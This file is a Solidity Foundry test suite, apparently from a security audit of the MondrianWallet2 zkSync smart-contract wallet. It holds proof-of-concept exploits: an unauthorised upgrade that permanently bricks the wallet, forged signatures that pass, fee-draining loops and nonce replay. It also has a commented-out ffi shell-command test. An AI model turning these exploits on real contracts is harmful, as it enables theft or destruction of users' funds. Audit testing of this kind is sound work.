// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {MondrianWallet2} from "src/MondrianWallet2.sol";

// Era Imports
import {
    Transaction,
    MemoryTransactionHelper
} from "lib/foundry-era-contracts/src/system-contracts/contracts/libraries/MemoryTransactionHelper.sol";
import {BOOTLOADER_FORMAL_ADDRESS} from "lib/foundry-era-contracts/src/system-contracts/contracts/Constants.sol";
import {ACCOUNT_VALIDATION_SUCCESS_MAGIC, IAccount} from
    "lib/foundry-era-contracts/src/system-contracts/contracts/interfaces/IAccount.sol";

// OZ Imports
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

// Foundry Devops
import {ZkSyncChainChecker} from "lib/foundry-devops/src/ZkSyncChainChecker.sol";

// interface _CheatCodes {
//     function ffi(string[] calldata) external returns (bytes memory);
// }

contract MondrianWallet2Test is Test, ZkSyncChainChecker {
    using MessageHashUtils for bytes32; 
    event Upgraded(address indexed implementation);
    MondrianWallet2 implementation;
    MondrianWallet2 mondrianWallet;
    ERC1967Proxy proxy; 
    ERC20Mock usdc;
    bytes4 constant EIP1271_SUCCESS_RETURN_VALUE = 0x1626ba7e;
    // uint8[8] storedArray;  
    // _CheatCodes cheatCodes = _CheatCodes(VM_ADDRESS);

    uint256 constant AMOUNT = type(uint256).max;
    bytes32 constant EMPTY_BYTES32 = bytes32(0);
    address constant ANVIL_DEFAULT_ACCOUNT = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function setUp() public {
        implementation = new MondrianWallet2();
        proxy = new ERC1967Proxy(address(implementation), "");
        mondrianWallet = MondrianWallet2(address(proxy));
        mondrianWallet.initialize();
        mondrianWallet.transferOwnership(ANVIL_DEFAULT_ACCOUNT);
        usdc = new ERC20Mock();
        // £NB: when writing up some of the security risks I HAVE TO NOT TO TAKE OUT THE FOLLOWING SENTENCE. 
        // vm.deal(address(mondrianWallet), AMOUNT);
    }

    function testZkOwnerCanExecuteCommands() public {
        // Arrange
        vm.deal(address(mondrianWallet), AMOUNT);
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);

        Transaction memory transaction =
            _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);

        // Act
        vm.prank(mondrianWallet.owner());
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        // Assert
        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
    }

    // You'll also need --system-mode=true to run this test
    function testZkValidateTransaction() public onlyZkSync {
        // Arrange
        vm.deal(address(mondrianWallet), AMOUNT);
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction =
            _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // Act
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        // Assert
        assertEq(magic, ACCOUNT_VALIDATION_SUCCESS_MAGIC);
    }

    // function testZkUpgradeContract() public onlyZkSync { // seems to work fine. 
    //     // Arrange
    //     vm.deal(address(mondrianWallet), AMOUNT);
    //     DummyContract dummyContract;
    //     dummyContract = new DummyContract();
    //     address dest = address(usdc);
    //     uint256 value = 0;
    //     bytes memory functionData; 
        
    //     // Validate transaction 1... 
    //     functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
    //     Transaction memory transaction1 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
    //     transaction1 = _signTransaction(transaction1);

    //     // Act
    //     vm.prank(BOOTLOADER_FORMAL_ADDRESS);
    //     bytes4 magic1 = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction1);

    //     mondrianWallet.upgradeToAndCall(address(dummyContract), "");

    //     // Validate transaction 2, which is _exactly_ the same as transaction 1, but in upgraded wallet. 
    //     functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
    //     Transaction memory transaction2 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
    //     transaction2 = _signTransaction(transaction2);

    //     // Act
    //     vm.prank(BOOTLOADER_FORMAL_ADDRESS);
    //     bytes4 magic2 = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction2);

    //     // Assert
    //     assertEq(magic1, ACCOUNT_VALIDATION_SUCCESS_MAGIC);
    //     assertEq(magic2, ACCOUNT_VALIDATION_SUCCESS_MAGIC);
    //     assert(transaction1.nonce != transaction2.nonce);
    // }

    // You'll also need --system-mode=true to run this test
    function testMissingReceiveBreaksContract() public onlyZkSync {
        // setting up accounts
        uint256 AMOUNT_TO_SEND = type(uint128).max;
        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
        vm.deal(THIRD_PARTY_ACCOUNT, AMOUNT);
        // Check if mondrianWallet indeed has no balance. 
        assertEq(address(mondrianWallet).balance, 0);  
        
        // create transaction  
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // Act & assert 
        // sending money directly to contract fails; it leaves contract with balance of 0. 
        vm.prank(mondrianWallet.owner());
        (bool success, ) = address(mondrianWallet).call{value: AMOUNT_TO_SEND}("");
        assertEq(success, false);
        assertEq(address(mondrianWallet).balance, 0);

        // as a result, validating transaction by bootloader fails
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
        vm.expectRevert();
        mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        // the same goes for executeTransactionFromOutside 
        vm.prank(THIRD_PARTY_ACCOUNT);
        vm.expectRevert();
        mondrianWallet.executeTransactionFromOutside(transaction);

        // also when eth is send with the transaction. 
        vm.prank(THIRD_PARTY_ACCOUNT);
        vm.expectRevert();
        mondrianWallet.executeTransactionFromOutside{value: AMOUNT_TO_SEND}(transaction);

        // Side note: it _is_ possible to execute function calls by owner through execute Transaction. But this defeats the purpose of Account Abstraction.
        // because there is no payMaster account, transactions NEED to be paid by contract. 
        vm.prank(mondrianWallet.owner());
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
    }
    
    // You'll also need --system-mode=true to run this test
    function testAnyOneCanUpgradeAndKillAccount() public onlyZkSync {
        // setting up accounts
        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
        vm.deal(address(mondrianWallet), AMOUNT);
        // created an implementation (contract KilledImplementation below) in which every function reverts with the following error: `KilledImplementation__ContractIsDead`. 
        KilledImplementation killedImplementation = new KilledImplementation(); 

        // create transaction  
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // Act
        // a random third party - anyone - can upgrade the wallet.
        // upgrade to `killedImplementation`.
        vm.expectEmit(true, false, false, false);
        emit Upgraded(address(killedImplementation));

        vm.prank(THIRD_PARTY_ACCOUNT);
        mondrianWallet.upgradeToAndCall(address(killedImplementation), "");

        // Assert 
        // With the upgraded implementation, every function reverts with `KilledImplementation__ContractIsDead`. 
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
        mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        vm.prank(mondrianWallet.owner());
        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);

        // crucially, also the upgrade call also reverts. Upgrading back to original is impossible. 
        vm.prank(mondrianWallet.owner());
        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
        mondrianWallet.upgradeToAndCall(address(implementation), "");

        // ... and so on. The contract is dead. 
    }

    // You'll also need --system-mode=true to run this test
    function testMissingValidateCheckAllowsExecutionUnvalidatedTransactions() public onlyZkSync {
        // setting up accounts
        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
        vm.deal(address(mondrianWallet), AMOUNT);
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);

        // Act
        // we sign transaction with a random signature 
        bytes32 unsignedTransactionHash = MemoryTransactionHelper.encodeHash(transaction);
        uint256 RANDOM_KEY = 0x00000000000000000000000000000000000000000000000000000000007ceda5;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(RANDOM_KEY, unsignedTransactionHash);
        Transaction memory signedTransaction = transaction;
        signedTransaction.signature = abi.encodePacked(r, s, v);

        // and the transaction still passes. 
        vm.prank(THIRD_PARTY_ACCOUNT);
        mondrianWallet.executeTransactionFromOutside(signedTransaction);
        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
    }

    // You'll also need --system-mode=true to run this test
    function testRenouncingOwnershipLeavesEthStuckInContract() public onlyZkSync {
        // Prepare
        // setting up accounts
        vm.deal(address(mondrianWallet), AMOUNT); 
        // create transaction  
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // Act
        vm.prank(mondrianWallet.owner()); 
        mondrianWallet.renounceOwnership();

        // Assert
        // transaction execution fails
        vm.prank(ANVIL_DEFAULT_ACCOUNT);
        vm.expectRevert(MondrianWallet2.MondrianWallet2__NotFromBootLoaderOrOwner.selector);
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
        
        // also transaction validation fails 
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);  
        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
        vm.assertEq(magic, bytes4(0));
    }

    // You'll also need --system-mode=true to run this test
    function testBlockTransactionByPayingForTransaction() public onlyZkSync {
        // Prepare
        // setting up accounts
        uint256 FUNDS_MONDRIAN_WALLET = 1e16; 
        vm.deal(address(mondrianWallet), FUNDS_MONDRIAN_WALLET); 
        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
        
        // create transaction  
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // using information embedded in the Transaction struct, we can calculate how much fee will be paid for the transaction
        // and, crucially, how many runs we need to move all funds from the Mondrian Wallet to the Bootloader.  
        uint256 feeAmountPerTransaction = transaction.maxFeePerGas * transaction.gasLimit;
        uint256 runsNeeded = FUNDS_MONDRIAN_WALLET / feeAmountPerTransaction; 
        console2.log("runsNeeded to drain Mondrian Wallet:", runsNeeded); 

        // by calling payForTransaction a sufficient amount of times, the contract is drained.  
        vm.startPrank(THIRD_PARTY_ACCOUNT); 
        for (uint256 i; i < runsNeeded; i++) {
            mondrianWallet.payForTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
        }
        vm.stopPrank();         
        
        // When the bootloader calls validateTransaction, it fails: Not Enough Balance.   
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
        vm.expectRevert(MondrianWallet2.MondrianWallet2__NotEnoughBalance.selector); 
        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
    }

        // You'll also need --system-mode=true to run this test
    function testFunctionsCanBeCalledViaDelegateCall() public onlyZkSync {
        // Prepare
        DelegatedImplementation delegatedImplementation = new DelegatedImplementation(); 
        ERC1967Proxy delegatedProxy = new ERC1967Proxy(address(delegatedImplementation), "");
        vm.deal(address(mondrianWallet), AMOUNT); 
        vm.deal(address(delegatedImplementation), AMOUNT); 
        delegatedImplementation.initialize();
        delegatedImplementation.transferOwnership(ANVIL_DEFAULT_ACCOUNT);

        // create a transaction 
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // the owner calls the delegatedExecuteTransaction on usingDelegateCallContract. 
        // which in turns does a delegated call to mondrianWallet.executeTransaction.
        
        vm.prank(mondrianWallet.owner()); 
        delegatedImplementation.delegatedExecuteTransaction(address(proxy)); // EMPTY_BYTES32, EMPTY_BYTES32, transaction

        // it all passed.
        // console2.log("owner :", mondrianWallet.owner());  
        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
        // assertEq(usdc.balanceOf(address(delegatedImplementation)), AMOUNT);
    }

    function testExecuteTransactionBreaksUniquenessNonce() public onlyZkSync {
        vm.deal(address(mondrianWallet), AMOUNT); 
        uint256 amoundUsdc = 1e10; 
        uint256 numberOfRuns = 3; 

        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), amoundUsdc);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        vm.startPrank(mondrianWallet.owner());
        for (uint256 i; i < numberOfRuns; i++) {  
            // the nonce stays at 0.               
            vm.assertEq(transaction.nonce, 0);
            // and the execution passes without problem.  
            mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
        }
        vm.stopPrank();

        // this leaves the owner with 3 times the amount of usdc coins - because the contracts has been called three times. With the exact same sender-nonce pair. 
        assertEq(usdc.balanceOf(address(mondrianWallet)), numberOfRuns * amoundUsdc);
    } 

    // You'll also need --system-mode=true to run this test
    function testMemoryAndReturnData() public onlyZkSync {
        TargetContract targetContract = new TargetContract(); 
        vm.deal(address(mondrianWallet), 100); 
        address dest = address(targetContract);
        uint256 value = 0;
        uint256 inputValue; 

        // transaction 1
        inputValue = 310_000;
        bytes memory functionData1 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
        Transaction memory transaction1 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData1);
        transaction1 = _signTransaction(transaction1);

        // transaction 2 
        inputValue = 475_000;
        bytes memory functionData2 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
        Transaction memory transaction2 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData2);
        transaction2 = _signTransaction(transaction2);

        vm.startPrank(ANVIL_DEFAULT_ACCOUNT);
        // the first transaction fails because of an EVM error. 
        // this transaction will pass with the mitigations implemented (see the report). 
        vm.expectRevert(); 
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction1);

        // the second transaction fails because of an ExecutionFailed error. 
        // this transaction will also not pass with the mitigations implemented (see the report). 
        vm.expectRevert(); 
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction2);

        vm.stopPrank(); 
    }

    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/
    function _signTransaction(Transaction memory transaction) internal view returns (Transaction memory) {
        bytes32 unsignedTransactionHash = MemoryTransactionHelper.encodeHash(transaction);
        // bytes32 digest = unsignedTransactionHash.toEthSignedMessageHash();
        uint8 v;
        bytes32 r;
        bytes32 s;
        uint256 ANVIL_DEFAULT_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        (v, r, s) = vm.sign(ANVIL_DEFAULT_KEY, unsignedTransactionHash);
        Transaction memory signedTransaction = transaction;
        signedTransaction.signature = abi.encodePacked(r, s, v);
        return signedTransaction;
    }

    function _createUnsignedTransaction(
        address from,
        uint8 transactionType,
        address to,
        uint256 value,
        bytes memory data
    ) internal view returns (Transaction memory) {
        uint256 nonce = vm.getNonce(address(mondrianWallet));
        bytes32[] memory factoryDeps = new bytes32[](0);
        return Transaction({
            txType: transactionType, // type 113 (0x71).
            from: uint256(uint160(from)),
            to: uint256(uint160(to)),
            gasLimit: 16777216,
            gasPerPubdataByteLimit: 16777216,
            maxFeePerGas: 16777216,
            maxPriorityFeePerGas: 16777216,
            paymaster: 0,
            nonce: nonce,
            value: value,
            reserved: [uint256(0), uint256(0), uint256(0), uint256(0)],
            data: data,
            signature: hex"",
            factoryDeps: factoryDeps,
            paymasterInput: hex"",
            reservedDynamic: hex""
        });
    }

    // function testPwned() public {
    //     string[] memory cmds = new string[](2);
    //     cmds[0] = "touch";
    //     cmds[1] = string.concat("youve-been-pwned");
    //     cheatCodes.ffi(cmds);
    // }
}

contract DelegatedImplementation is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function initialize() public initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    function delegatedExecuteTransaction(address _targetContract) external payable { 
    // function delegatedExecuteTransaction(bytes32 /*_txHash */, bytes32 /*_suggestedSignedHash*/, Transaction calldata _transaction, address _targetContract) external payable {  
        console2.log("DELEGATE IS GOING TO BE TRIGGERED");  
        _targetContract.delegatecall(
            abi.encodeWithSignature("renounceOwnership()")
            // abi.encodeWithSignature("executeTransaction(bytes32,bytes32,(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256[4],bytes,bytes,bytes32[],bytes,bytes))", 
            // _transaction)
        ); 
    }

    // notice: a standard IAccount with no functionality implemented.   
    function validateTransaction(bytes32 _txHash, bytes32 _suggestedSignedHash, Transaction calldata _transaction)
        external
        payable
        returns (bytes4 magic) {
            return bytes4(0); 
        }

    function executeTransaction(bytes32 _txHash, bytes32 _suggestedSignedHash, Transaction calldata _transaction)
        external
        payable 
    {}

    function executeTransactionFromOutside(Transaction calldata _transaction) external payable
    {}

    function payForTransaction(bytes32 _txHash, bytes32 _suggestedSignedHash, Transaction calldata _transaction)
        external
        payable
    {}

    function prepareForPaymaster(bytes32 _txHash, bytes32 _possibleSignedHash, Transaction calldata _transaction)
        external
        payable
    {}

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner 
    {}
}

contract TargetContract {
    uint256 public arrayStorage;  

    constructor() {}
    
    function writeToArrayStorage(uint256 _value) external returns (uint256[] memory value) {
        arrayStorage = _value;

        uint256[] memory arr = new uint256[](_value);  
        
        return arr;
    }
}

contract KilledImplementation is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable  {
    error KilledImplementation__ContractIsDead();

    function initialize() public initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
        external
        payable
        returns (bytes4 magic)
    {
        if (_transaction.txType != 0) {
            revert KilledImplementation__ContractIsDead();
        }
        return bytes4(0); 
    }

    function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable  {
        revert KilledImplementation__ContractIsDead(); 
    }

    function executeTransactionFromOutside(Transaction memory _transaction) external payable {
        revert KilledImplementation__ContractIsDead(); 
    }

    function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable {
        revert KilledImplementation__ContractIsDead(); 
    }

    function prepareForPaymaster(bytes32, /*_txHash*/ bytes32, /*_possibleSignedHash*/ Transaction memory /*_transaction*/) external payable {
        revert KilledImplementation__ContractIsDead(); 
    }

    function _authorizeUpgrade(address newImplementation) internal override {
        revert KilledImplementation__ContractIsDead();  
    }
}


